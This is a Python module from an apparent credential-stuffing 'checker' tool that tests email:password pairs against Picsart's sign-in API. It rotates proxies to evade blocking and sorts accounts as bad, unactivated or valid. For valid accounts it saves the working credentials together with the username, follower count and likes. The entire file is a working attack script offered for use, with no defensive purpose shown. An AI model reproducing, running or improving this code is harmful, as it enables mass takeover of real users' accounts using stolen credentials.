from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import get,post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" ,
            "Pragma": "no-cache" ,
            "Accept": "*/*" 
        }
        data = {'username':email,'password':password,'provider':'picsart'}
        try:
            response = post('https://api.picsart.com/users/signin.json',json=data,headers=headers,proxies=proxy_set,timeout=Checker.timeout)
            if "username_or_password_incorrect\"," in response.text or "{\"status\":\"error\",\"" in response.text:
                retries += 1
            elif "is_activated\":false,\"" in response.text:
                Checker.custom += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("custom",email+":"+password,"Picsart")
                save("Picsart","custom",Checker.time,email+":"+password)
                return
            elif "is_activated\":true,\"" in response.text:
                capture = response.json()
                followers = capture["followers_count"]
                likes = capture['likes_count']
                username = capture['username']
                Checker.good += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("good",email+":"+password,"Picsart")
                save("Picsart","good",Checker.time,email+":"+password+f" | Username: {username} | Followers: {followers} | Likes: {likes}")
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return